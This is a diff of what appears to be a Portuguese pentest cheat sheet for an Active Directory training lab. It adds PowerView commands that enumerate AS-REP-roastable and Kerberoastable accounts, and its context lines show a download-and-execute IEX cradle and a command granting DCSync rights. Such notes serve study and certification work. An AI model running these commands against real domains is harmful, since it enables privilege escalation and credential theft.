@@ -2656,11 +2656,20 @@ Get-ObjectAcl -Distinguishedname "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/crtp/PowerView.ps1")
 Add-ObjectAcl -TargetDistinguishedname "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountname student209 -Rights Dcsync -Verbose
 ```
-##### POWERVIEW OLD - LISTAR SPN
+##### POWERVIEW OLD - LISTAR SPN (KERBEROASTING)
 ```
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
 Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}
 ```
+##### POWERVIEW (NOVO) - LISTAR USUARIOS COM PREAUTH DISABLED (KERBEROASTING AS-REP)
+```
+Get-DomainUser -PreauthNotRequired -Verbose
+Get-DomainUser -PreauthNotRequired 
+Get-DomainUser -PreauthNotRequired | select samaccountname
+Get-DomainUser -PreauthNotRequired | ?{$_.memberof -match 'Domain Admins'}
+Get-DomainUser -PreauthNotRequired | ?{$_.memberof -match 'Domain Admins'} | select samaccountname
+```
+
 
 
 
